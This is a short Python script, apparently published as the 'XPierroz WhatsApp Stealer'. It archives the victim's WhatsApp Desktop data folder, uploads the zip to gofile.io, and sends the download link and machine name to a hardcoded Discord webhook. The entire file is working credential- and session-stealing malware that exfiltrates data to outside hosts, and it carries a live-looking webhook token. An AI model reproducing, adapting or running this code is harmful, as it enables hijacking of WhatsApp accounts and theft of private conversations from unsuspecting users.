import os, requests, time, socket, shutil

# PSG > OM

WEBHOOK = "https://discord.com/api/webhooks/1177945392856449065/WZhIaJKchwA_vNvnxRQekzrOCZYEzbeXNk4mfWYW4b0J6zw4VVk9THJU-Y6SM8tiGPTD"

temp = os.environ.get('TMP') or os.environ.get('TEMP')
direct = f"{os.getenv('LOCALAPPDATA')}\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm"

def upload(path):
    for x in range(10):
        try:
            rr = requests.post(
                f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
                files={
                    "file": open(path, "rb")
                },
            ).json()["data"]["downloadPage"]
            return rr
        except Exception:
            time.sleep(2)
    return False

def l_om_est_eclate():
    try:
        shutil.make_archive(os.path.join(temp, "ssouput"), "zip", direct)
    except Exception:
        pass
    
    m = upload(f"{temp}\\ssouput.zip")
    os.remove(f"{temp}\\ssouput.zip")
    
    embed = {
        "title": "**XPierroz WhatsApp Stealer Report**",
        "description": f"🖥️ Pc Name: {socket.gethostname()}\n📎 Url: {m}",
        "color": 0x008000
    }
    
    payload = {
        "content": "🔔 Grab Alert ||@everyone||",
        "username": "XPierroz WhatsApp Stealer",
        "avatar_url": "https://github.com/xpierroz/WhatsappStealer/blob/master/assets/whatsapp.png?raw=true",
        "embeds": [embed]
    }

    headers = {
        "Content-Type": "application/json"
    }
    
    requests.post(WEBHOOK, json=payload, headers=headers)

l_om_est_eclate()
